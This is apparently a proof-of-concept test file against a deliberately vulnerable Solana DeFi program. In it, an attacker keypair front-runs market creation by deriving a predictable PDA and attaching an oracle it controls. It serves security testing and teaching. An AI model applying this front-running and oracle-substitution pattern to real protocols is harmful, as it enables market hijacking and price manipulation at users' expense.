import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { VulnerableDefiProtocol } from "../target/types/vulnerable_defi_protocol";
import { createMint, getOrCreateAssociatedTokenAccount } from "@solana/spl-token";
import { assert } from "chai";

// POC #2: PDA Collision via Predictable Seeds

describe("POC #2 - PDA Collision via Predictable Seeds", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);
  const program = anchor.workspace.VulnerableDefiProtocol as Program<VulnerableDefiProtocol>;

  let admin: anchor.web3.Keypair;
  let attacker: anchor.web3.Keypair;
  let supplyMint: anchor.web3.PublicKey;
  let collateralMint: anchor.web3.PublicKey;
  let configKeypair: anchor.web3.Keypair;

  before(async () => {
    admin = anchor.web3.Keypair.generate();
    attacker = anchor.web3.Keypair.generate();
    const airdropAmount = 10 * anchor.web3.LAMPORTS_PER_SOL;
    for (const kp of [admin, attacker]) {
      await provider.connection.confirmTransaction(
        await provider.connection.requestAirdrop(kp.publicKey, airdropAmount)
      );
    }

    supplyMint = await createMint(provider.connection, admin, admin.publicKey, null, 6);
    collateralMint = await createMint(provider.connection, admin, admin.publicKey, null, 6);

    // Initialize config
    configKeypair = anchor.web3.Keypair.generate();
    await program.methods
      .initialize(admin.publicKey)
      .accounts({
        config: configKeypair.publicKey,
        signer: admin.publicKey,
        systemProgram: anchor.web3.SystemProgram.programId,
      } as any)
      .signers([admin, configKeypair])
      .rpc();
  });

  it("Attacker front-runs and creates market with predictable seeds", async () => {
    const marketId = new anchor.BN(1);

    const [marketPDA] = anchor.web3.PublicKey.findProgramAddressSync(
      [
        Buffer.from("market"),
        marketId.toArrayLike(Buffer, "le", 8),
        supplyMint.toBuffer(),
        collateralMint.toBuffer(),
      ],
      program.programId
    );

    const attackerOracle = anchor.web3.Keypair.generate();
    await program.methods
      .createOracle(new anchor.BN(1_000_000))
      .accounts({ oracle: attackerOracle.publicKey, signer: attacker.publicKey, systemProgram: anchor.web3.SystemProgram.programId } as any)
      .signers([attacker, attackerOracle])
      .rpc();

    const vaultAccount = await getOrCreateAssociatedTokenAccount(
      provider.connection,
      attacker,
      supplyMint,
      marketPDA,
      true
    );

    await program.methods
      .createMarket(marketId)
      .accounts({
        market: marketPDA,
        config: configKeypair.publicKey,
        supplyMint,
        collateralMint,
        supplyOracle: attackerOracle.publicKey,
        collateralOracle: attackerOracle.publicKey,
        vault: vaultAccount.address,
        authority: attacker.publicKey,
        systemProgram: anchor.web3.SystemProgram.programId,
      } as any)
      .signers([attacker])
      .rpc();

    assert.isTrue(true, "Market created by attacker using predictable PDA");
  });
});
